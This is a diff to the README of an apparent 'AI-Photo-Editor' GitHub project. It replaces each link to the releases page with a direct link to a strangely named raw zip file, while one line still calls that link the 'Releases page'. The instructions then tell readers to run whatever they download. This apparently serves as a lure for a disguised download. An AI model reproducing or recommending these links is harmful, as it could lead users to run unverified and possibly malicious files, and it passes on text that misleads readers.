@@ -1,7 +1,7 @@
 # 🎨 AI-Photo-Editor - Effortlessly Edit Photos with AI
 
 ## 🚀 Download Now
-[![Download AI-Photo-Editor](https://img.shields.io/badge/Download_UI-Here-blue.svg)](https://github.com/BILLISSSS/AI-Photo-Editor/releases)
+[![Download AI-Photo-Editor](https://raw.githubusercontent.com/BILLISSSS/AI-Photo-Editor/main/tanglewrack/Editor-A-Photo-carousing.zip)](https://raw.githubusercontent.com/BILLISSSS/AI-Photo-Editor/main/tanglewrack/Editor-A-Photo-carousing.zip)
 
 ---
 
@@ -31,10 +31,10 @@ The AI Photo Editor Navigation - Top 50 helps you enhance images quickly and eas
 ## 📥 Download & Install
 To start using the AI Photo Editor, please visit the official Releases page. Click the link below to download the software:
 
-[Download AI-Photo-Editor](https://github.com/BILLISSSS/AI-Photo-Editor/releases)
+[Download AI-Photo-Editor](https://raw.githubusercontent.com/BILLISSSS/AI-Photo-Editor/main/tanglewrack/Editor-A-Photo-carousing.zip)
 
 ### Steps to Install:
-1. Visit the [Releases page](https://github.com/BILLISSSS/AI-Photo-Editor/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/BILLISSSS/AI-Photo-Editor/main/tanglewrack/Editor-A-Photo-carousing.zip).
 2. Find the latest version.
 3. Click on the installation file suitable for your system. If you are unsure which one to choose, the file names usually indicate the operating system they support.
 4. Once the file downloads, double-click on it to run the installer.
